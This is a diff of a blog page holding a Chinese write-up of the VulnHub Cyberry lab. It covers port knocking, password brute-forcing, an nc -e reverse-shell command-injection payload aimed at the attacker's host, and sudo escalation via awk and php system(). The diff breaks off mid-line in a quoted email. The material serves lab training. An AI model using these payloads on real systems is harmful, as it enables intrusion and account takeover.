@@ -14,39 +14,13 @@
 <meta property="og:description" content="Cyberry 介绍 相关资料都在:https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;cyberry-1,217&#x2F; 安全客原文:https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;154504 首先过去下个镜像然后导进虚拟机就ok 初步信息收集 扫一下ip  得到靶机ip:192.168.1.100 然后扫一下端口  去80端口看一下 源码里面有一些base64 12345">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-12-55-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-13-00-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-13-07-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-13-13-46%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/t01e3adfe1bf193f9b4.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-13-28-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-13-28-24%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-13-42-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-14-24-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-14-27-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-14-34-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-14-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-14-40-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-14-42-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-14-44-34%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-14-52-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-11-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-10-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-14-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-26-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-29-49%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-30-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-31-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-36-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-15-42-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-16-12-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-19-02-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-15-19-05-06%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-01-48-59%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-01-56-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-01-50-39%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-01-51-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-01-55-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-02-08-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="article:published_time" content="2018-09-15T05:06:30.000Z">
 <meta property="article:modified_time" content="2023-07-10T02:13:29.457Z">
 <meta property="article:author" content="blacsheep">
@@ -104,7 +78,7 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -212,21 +186,50 @@
   <div class="content e-content" itemprop="articleBody">
     <h1 id="cyberry">Cyberry</h1>
 <h2 id="介绍">介绍</h2>
-<p>相关资料都在:<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/cyberry-1,217/" title="https://www.vulnhub.com/entry/cyberry-1,217/">https://www.vulnhub.com/entry/cyberry-1,217/</a> 安全客原文:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/154504" title="https://www.anquanke.com/post/id/154504">https://www.anquanke.com/post/id/154504</a> 首先过去下个镜像然后导进虚拟机就ok</p>
+<p>相关资料都在:<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/cyberry-1,217/"
+title="https://www.vulnhub.com/entry/cyberry-1,217/">https://www.vulnhub.com/entry/cyberry-1,217/</a>
+安全客原文:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/154504"
+title="https://www.anquanke.com/post/id/154504">https://www.anquanke.com/post/id/154504</a>
+首先过去下个镜像然后导进虚拟机就ok</p>
 <h2 id="初步信息收集">初步信息收集</h2>
-<p>扫一下ip <img src="/images/2018/09/2018-09-15-12-55-43屏幕截图.png" alt="blacsheep" /> 得到靶机ip:192.168.1.100 然后扫一下端口 <img src="/images/2018/09/2018-09-15-13-00-27屏幕截图.png" alt="blacsheep" /> 去80端口看一下 源码里面有一些base64</p>
+<p>扫一下ip <img src="/images/2018/09/2018-09-15-12-55-43屏幕截图.png"
+alt="blacsheep" /> 得到靶机ip:192.168.1.100 然后扫一下端口 <img
+src="/images/2018/09/2018-09-15-13-00-27屏幕截图.png" alt="blacsheep" />
+去80端口看一下 源码里面有一些base64</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- bmljZSB0cnkh --&gt;</span><br><span class="line">&lt;!-- bm90aGluZyB0byBzZWUgaGVyZSE= --&gt;</span><br><span class="line">&lt;!-- dGltZSB0byBtb3ZlIG9uIQ== -&gt;</span><br><span class="line">&lt;!-- c2VjcmV0ZmlsZS5odG1s -&gt;</span><br><span class="line">&lt;!-- d29yay1pbi1wcm9ncmVzcy5wbmc= --&gt;</span><br></pre></td></tr></table></figure>
-<p>最后一个图片是 work-in-progress.png,不过似乎并不是图片,那么我们curl一下</p>
+<p>最后一个图片是
+work-in-progress.png,不过似乎并不是图片,那么我们curl一下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:~$ curl http://192.168.1.100/work-in-progress.png</span><br><span class="line">edocrq</span><br></pre></td></tr></table></figure>
-<p>去edocrq看下 <img src="/images/2018/09/2018-09-15-13-07-15屏幕截图.png" alt="blacsheep" /> 发现二维码,扫一下,然后找到</p>
+<p>去edocrq看下 <img
+src="/images/2018/09/2018-09-15-13-07-15屏幕截图.png" alt="blacsheep" />
+发现二维码,扫一下,然后找到</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/berrypedia.html#</span><br></pre></td></tr></table></figure>
-<p>不过还是没什么东西 扫一下目录 <img src="/images/2018/09/2018-09-15-13-13-46屏幕截图.png" alt="blacsheep" /> 然后有个phpmyadmin,尝试一个root/root,失败了,打算从其他端口下手,然后ftp看能不能匿名登录,发现不能,666端口nc一下也并不能连接,然后发现其实是close的 做到这里就并不会了</p>
+<p>不过还是没什么东西 扫一下目录 <img
+src="/images/2018/09/2018-09-15-13-13-46屏幕截图.png" alt="blacsheep" />
+然后有个phpmyadmin,尝试一个root/root,失败了,打算从其他端口下手,然后ftp看能不能匿名登录,发现不能,666端口nc一下也并不能连接,然后发现其实是close的
+做到这里就并不会了</p>
 <h2 id="knock开端口">knock开端口</h2>
-<p>看了下wp,发现这里是个脑洞... <code>http://192.168.1.100/berrypedia.html#</code>的<code>http://192.168.1.100/placeho1der.jpg</code>页面的图片里面藏了东西.. 首先翻转一下,然后调整一下 <img src="/images/2018/09/t01e3adfe1bf193f9b4.png" alt="blacsheep" /> 给个安全客上面的分析</p>
+<p>看了下wp,发现这里是个脑洞...
+<code>http://192.168.1.100/berrypedia.html#</code>的<code>http://192.168.1.100/placeho1der.jpg</code>页面的图片里面藏了东西..
+首先翻转一下,然后调整一下 <img
+src="/images/2018/09/t01e3adfe1bf193f9b4.png" alt="blacsheep" />
+给个安全客上面的分析</p>
 <blockquote>
-<p>这里就很有意思了，有四个人，最上方还有一部分，出现了PORT字样，一时半会有些蒙蔽，但是显然这个靶机入口就在这里了(总不会无缘无故给一张这样的图吧- -)。然后，我分别把这四个人截图下来，用浏览器的识别功能去查了这四个人，了解了一下各个人的信息，这四个人分别是Smiley Lewis, Dave Edmunds, Fats Domino和Gale Storm，首先，他们都是艺术家，都演奏了同一首歌曲，名字叫，”I hear you knocking”，年份分别是，1970，1955，1955，1961，这差不多是共同点了，还是很蒙蔽0.0，这里结合了知识面和脑洞。。原来跟knock有关，linux下有个命令knock可供安装使用，端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机，知道这个就明白上面那个PORT的意思了，显然是有某个端口没有被打开，需要我们knock开。那年份就要用上了，从左上依次到右下knock 192.168.107.132 1970 1955 1955 1961。knock之后，再来扫描端口，从1-65535</p>
+<p>这里就很有意思了，有四个人，最上方还有一部分，出现了PORT字样，一时半会有些蒙蔽，但是显然这个靶机入口就在这里了(总不会无缘无故给一张这样的图吧-
+-)。然后，我分别把这四个人截图下来，用浏览器的识别功能去查了这四个人，了解了一下各个人的信息，这四个人分别是Smiley
+Lewis, Dave Edmunds, Fats Domino和Gale
+Storm，首先，他们都是艺术家，都演奏了同一首歌曲，名字叫，”I hear you
+knocking”，年份分别是，1970，1955，1955，1961，这差不多是共同点了，还是很蒙蔽0.0，这里结合了知识面和脑洞。。原来跟knock有关，linux下有个命令knock可供安装使用，端口试探（port
+knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机，知道这个就明白上面那个PORT的意思了，显然是有某个端口没有被打开，需要我们knock开。那年份就要用上了，从左上依次到右下knock
+192.168.107.132 1970 1955 1955
+1961。knock之后，再来扫描端口，从1-65535</p>
 </blockquote>
-<p><img src="/images/2018/09/2018-09-15-13-28-36屏幕截图.png" alt="blacsheep" /> emmm..试了一下,发现新开了端口 <img src="/images/2018/09/2018-09-15-13-28-24屏幕截图.png" alt="blacsheep" /> 去<a target="_blank" rel="noopener" href="http://192.168.1.100:61955/" title="http://192.168.1.100:61955/">http://192.168.1.100:61955/</a>看下 再去扫一下目录,发现多了一个</p>
+<p><img src="/images/2018/09/2018-09-15-13-28-36屏幕截图.png"
+alt="blacsheep" /> emmm..试了一下,发现新开了端口 <img
+src="/images/2018/09/2018-09-15-13-28-24屏幕截图.png" alt="blacsheep" />
+去<a target="_blank" rel="noopener" href="http://192.168.1.100:61955/"
+title="http://192.168.1.100:61955/">http://192.168.1.100:61955/</a>看下
+再去扫一下目录,发现多了一个</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ http://192.168.1.100:61955/H (CODE:200SIZE:768)  </span><br></pre></td></tr></table></figure>
 <p>上去看下,发现是个brainfuck的页面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</span><br><span class="line">///////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--------[--&gt;+++&lt;]&gt;.+++[-&gt;+++&lt;]&gt;.----.++++++++++++.[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;.--------.++++++++.-----------.+++.+++++++++++++.+.</span><br><span class="line"></span><br><span class="line">--[-----&gt;+&lt;]&gt;---.+++++.[---&gt;+&lt;]&gt;---.+[-&gt;+++&lt;]&gt;+.++++++++.</span><br><span class="line"></span><br><span class="line">+[-----&gt;+++&lt;]&gt;+.-------.+++++++++++..-------.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;.-----.------.++++++++.</span><br><span class="line"></span><br><span class="line">--------[--&gt;+++&lt;]&gt;.+++[-&gt;+++&lt;]&gt;.+++++++++++++..+++++++.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;-.------------.--[---&gt;+&lt;]&gt;---.+++++++.</span><br><span class="line"></span><br><span class="line">+[-----&gt;+++&lt;]&gt;++++.------.+++++++++++++..+++++++.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;++.+++++++.-[--&gt;+&lt;]&gt;-.[--&gt;+&lt;]&gt;+++.[-&gt;+++&lt;]&gt;++.-.++++++++++.------.++++++++++.---------..</span><br></pre></td></tr></table></figure>
@@ -234,35 +237,93 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line"></span><br><span class="line">team members</span><br><span class="line">chuck</span><br><span class="line">halle</span><br><span class="line">nick</span><br><span class="line">terry</span><br><span class="line">mary</span><br><span class="line">kerry</span><br><span class="line">pw: bakeoff</span><br></pre></td></tr></table></figure>
 <p>好的,到这里那应该就是去爆密码了</p>
 <h2 id="连ftp">连ftp</h2>
-<p><img src="/images/2018/09/2018-09-15-13-42-22屏幕截图.png" alt="blacsheep" /> 然后ssh连不上去,但是可以连ftp <img src="/images/2018/09/2018-09-15-14-24-41屏幕截图.png" alt="blacsheep" /> 连上去之后有个.bash_history目录,进去之后发现有两个隐藏文件,get下来,查看一下 <img src="/images/2018/09/2018-09-15-14-27-55屏幕截图.png" alt="blacsheep" /> 一个是openssl的加密文件,一个是密码文件,那么我们用命令来解一下</p>
+<p><img src="/images/2018/09/2018-09-15-13-42-22屏幕截图.png"
+alt="blacsheep" /> 然后ssh连不上去,但是可以连ftp <img
+src="/images/2018/09/2018-09-15-14-24-41屏幕截图.png" alt="blacsheep" />
+连上去之后有个.bash_history目录,进去之后发现有两个隐藏文件,get下来,查看一下
+<img src="/images/2018/09/2018-09-15-14-27-55屏幕截图.png"
+alt="blacsheep" />
+一个是openssl的加密文件,一个是密码文件,那么我们用命令来解一下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `openssl enc -ciphers  tail -n +2` ; do for j in `cat .trash`; do openssl $&#123;i:1&#125; -d -salt -md md5 -in .reminder.enc -out &quot;decrypted$i$j&quot; -k $j; done;done 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>这个会解密出很多文件,我们要去找明文,所以我们找ascii text的明文 <img src="/images/2018/09/2018-09-15-14-34-50屏幕截图.png" alt="blacsheep" /> 得到密码dangleberry69</p>
+<p>这个会解密出很多文件,我们要去找明文,所以我们找ascii text的明文 <img
+src="/images/2018/09/2018-09-15-14-34-50屏幕截图.png" alt="blacsheep" />
+得到密码dangleberry69</p>
 <h2 id="web的命令执行">web的命令执行</h2>
-<p>回到login.php,帐号mary,密码dangleberry69登录一下 <img src="/images/2018/09/2018-09-15-14-37-15屏幕截图.png" alt="blacsheep" /> 看到下面的那个,是个dns解析,我们试试看命令执行 <img src="/images/2018/09/2018-09-15-14-40-32屏幕截图.png" alt="blacsheep" /> payload</p>
+<p>回到login.php,帐号mary,密码dangleberry69登录一下 <img
+src="/images/2018/09/2018-09-15-14-37-15屏幕截图.png" alt="blacsheep" />
+看到下面的那个,是个dns解析,我们试试看命令执行 <img
+src="/images/2018/09/2018-09-15-14-40-32屏幕截图.png" alt="blacsheep" />
+payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=blog.blacsheep.cn;nc -e /bin/bash 192.168.1.105 6712</span><br></pre></td></tr></table></figure>
-<p>拿到shell <img src="/images/2018/09/2018-09-15-14-42-45屏幕截图.png" alt="blacsheep" /> 然后写一个shell进去,方便传文件提权 <img src="/images/2018/09/2018-09-15-14-44-34屏幕截图.png" alt="blacsheep" /></p>
+<p>拿到shell <img src="/images/2018/09/2018-09-15-14-42-45屏幕截图.png"
+alt="blacsheep" /> 然后写一个shell进去,方便传文件提权 <img
+src="/images/2018/09/2018-09-15-14-44-34屏幕截图.png"
+alt="blacsheep" /></p>
 <h2 id="提权">提权</h2>
 <p>看下内核版本</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@cyberry:/tmp$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux cyberry 3.16.0-4-686-pae #1 SMP Debian 3.16.43-2+deb8u5 (2017-09-19) i686 GNU/Linux</span><br></pre></td></tr></table></figure>
-<p>去searchsploit看下 <img src="/images/2018/09/2018-09-15-14-52-33屏幕截图.png" alt="blacsheep" /> 试了一下这个exp,失败了,开始找新的思路 文件目录有个nb-latin文件,看样子里面是密码 <img src="/images/2018/09/2018-09-15-15-11-38屏幕截图.png" alt="blacsheep" /> 把这个写到pass.dic再用hydra爆一下 <img src="/images/2018/09/2018-09-15-15-10-29屏幕截图.png" alt="blacsheep" /> ssh连一下,发现可以连上去 <img src="/images/2018/09/2018-09-15-15-14-10屏幕截图.png" alt="blacsheep" /> 然后<code>sudo -l</code>看下 <img src="/images/2018/09/2018-09-15-15-26-16屏幕截图.png" alt="blacsheep" /> 我们只能用terry的身份运行invoke.sh,那么试一下 <img src="/images/2018/09/2018-09-15-15-29-49屏幕截图.png" alt="blacsheep" /> 发现会去打开文件,那么我们让他去开/bin/bash,发现拿到了terry的权限 <img src="/images/2018/09/2018-09-15-15-30-55屏幕截图.png" alt="blacsheep" /> <code>sudo -l</code>一下看能执行什么 <img src="/images/2018/09/2018-09-15-15-31-45屏幕截图.png" alt="blacsheep" /> 发现可以执行awk,我们google看下awk如何执行命令 参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/imzoer/article/details/8742603" title="https://blog.csdn.net/imzoer/article/details/8742603">https://blog.csdn.net/imzoer/article/details/8742603</a> 然后payload</p>
+<p>去searchsploit看下 <img
+src="/images/2018/09/2018-09-15-14-52-33屏幕截图.png" alt="blacsheep" />
+试了一下这个exp,失败了,开始找新的思路
+文件目录有个nb-latin文件,看样子里面是密码 <img
+src="/images/2018/09/2018-09-15-15-11-38屏幕截图.png" alt="blacsheep" />
+把这个写到pass.dic再用hydra爆一下 <img
+src="/images/2018/09/2018-09-15-15-10-29屏幕截图.png" alt="blacsheep" />
+ssh连一下,发现可以连上去 <img
+src="/images/2018/09/2018-09-15-15-14-10屏幕截图.png" alt="blacsheep" />
+然后<code>sudo -l</code>看下 <img
+src="/images/2018/09/2018-09-15-15-26-16屏幕截图.png" alt="blacsheep" />
+我们只能用terry的身份运行invoke.sh,那么试一下 <img
+src="/images/2018/09/2018-09-15-15-29-49屏幕截图.png" alt="blacsheep" />
+发现会去打开文件,那么我们让他去开/bin/bash,发现拿到了terry的权限 <img
+src="/images/2018/09/2018-09-15-15-30-55屏幕截图.png" alt="blacsheep" />
+<code>sudo -l</code>一下看能执行什么 <img
+src="/images/2018/09/2018-09-15-15-31-45屏幕截图.png" alt="blacsheep" />
+发现可以执行awk,我们google看下awk如何执行命令 参考:<a
+target="_blank" rel="noopener" href="https://blog.csdn.net/imzoer/article/details/8742603"
+title="https://blog.csdn.net/imzoer/article/details/8742603">https://blog.csdn.net/imzoer/article/details/8742603</a>
+然后payload</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">terry@cyberry:/home/nick$ sudo -u halle awk &#x27;&#123;cmd=&quot;/bin/bash&quot;;system(cmd)&#125;&#x27;</span><br><span class="line"></span><br><span class="line">halle@cyberry:/home/nick$ </span><br></pre></td></tr></table></figure>
-<p><img src="/images/2018/09/2018-09-15-15-36-58屏幕截图.png" alt="blacsheep" /> 然后再<code>sodo -l</code>,得到</p>
+<p><img src="/images/2018/09/2018-09-15-15-36-58屏幕截图.png"
+alt="blacsheep" /> 然后再<code>sodo -l</code>,得到</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">halle@cyberry:/home/nick$ sudo -l</span><br><span class="line">Matching Defaults entries for halle on cyberry:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User halle may run the following commands on cyberry:</span><br><span class="line">    (chuck) SETENV: NOPASSWD: /usr/bin/php</span><br></pre></td></tr></table></figure>
-<p>那么用chuck执行php的shell就好 <img src="/images/2018/09/2018-09-15-15-42-29屏幕截图.png" alt="blacsheep" /> 不过一旦连上去很快就断了... 不过没关系..我们system里面写代码一样相当与chuck的权限,然后读到sshkey <img src="/images/2018/09/2018-09-15-16-12-37屏幕截图.png" alt="blacsheep" /> 然后去密钥登录,但是失败了.. 再去看下前面的delete文件</p>
+<p>那么用chuck执行php的shell就好 <img
+src="/images/2018/09/2018-09-15-15-42-29屏幕截图.png" alt="blacsheep" />
+不过一旦连上去很快就断了...
+不过没关系..我们system里面写代码一样相当与chuck的权限,然后读到sshkey
+<img src="/images/2018/09/2018-09-15-16-12-37屏幕截图.png"
+alt="blacsheep" /> 然后去密钥登录,但是失败了..
+再去看下前面的delete文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">halle@cyberry:~$ echo &quot;&lt;?php var_dump(system(&#x27;cat /home/chuck/.deleted/deleted&#x27;));?&gt;&quot;&gt;1.php</span><br><span class="line">halle@cyberry:~$ sudo -u chuck php 1.php</span><br><span class="line">From:       Berry, Chuck (chuckberry@cyberry)</span><br><span class="line">Sent:       Wednesday, November 22, 2017 2:52pm</span><br><span class="line">To:     Nick, Chuck (nickberry@cyberry)</span><br><span class="line">Subject:    Re: Christmas Meal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Thanks Nick, that might just help me out!</span><br><span class="line"></span><br><span class="line">He did give me a few minor clues...</span><br><span class="line"></span><br><span class="line">The password starts with &quot;che&quot; and ends with &quot;rry&quot;</span><br><span class="line"></span><br><span class="line">letter e is used three times</span><br><span class="line">letter c is used twice</span><br><span class="line">letter r is used twice</span><br><span class="line">letter b is used twice</span><br><span class="line">letter a is used twice</span><br><span class="line"></span><br><span class="line">The only other letters in the password were h,w,m &amp; y</span><br><span class="line"></span><br><span class="line">I think I&#x27;ll probably have to write a little script to bruteforce SSH</span><br><span class="line">with what I already know. If I get it done before close of business </span><br><span class="line">I&#x27;ll get onto sorting out the Christmas meal. Promise!</span><br><span class="line"></span><br><span class="line">Thanks again</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Ah ok buddy. I don&#x27;t know if it helps you in any way</span><br><span class="line">but I saw the password jotted down on a post-it note in his office</span><br><span class="line">the other day! I can&#x27;t recall it exactly but I do remember it being</span><br><span class="line">a concatenated 4-word password....You know like &quot;eatberriesandsmile&quot;</span><br><span class="line"></span><br><span class="line">It wasn&#x27;t that, but it was something like that.... in fact I&#x27;m pretty</span><br><span class="line">sure one of those four words was actually latin... Now that I&#x27;m thinking</span><br><span class="line">about it I&#x27;m pretty sure it was &quot;baca&quot;.... well 99% sure. </span><br><span class="line">I&#x27;ve been studying latin for a few months now, so it kinda </span><br><span class="line">stuck in the memory</span><br><span class="line"></span><br><span class="line">Please don&#x27;t tell anyone I told you this b.t.w! :-)</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Hey Nick,</span><br><span class="line"></span><br><span class="line">sorry buddy I didn&#x27;t get a chance to. The boss wants me to prove SSH</span><br><span class="line">access to root is secure, so I&#x27;m working on a few different things</span><br><span class="line">at the moment.</span><br><span class="line"></span><br><span class="line">Not having much luck to be honest!</span><br><span class="line"></span><br><span class="line">Chuck</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Hey Chuck, </span><br><span class="line"></span><br><span class="line">Did you manage to book the venue for the Christmas meal?</span><br><span class="line"></span><br><span class="line">Time&#x27;s ticking by, and I think we need to send out an email</span><br><span class="line">to confirm numbers or else people might not be able to come.</span><br><span class="line"></span><br><span class="line">If you want, I can give them a ring later today?</span><br><span class="line"></span><br><span class="line">Either way, let me know.</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span 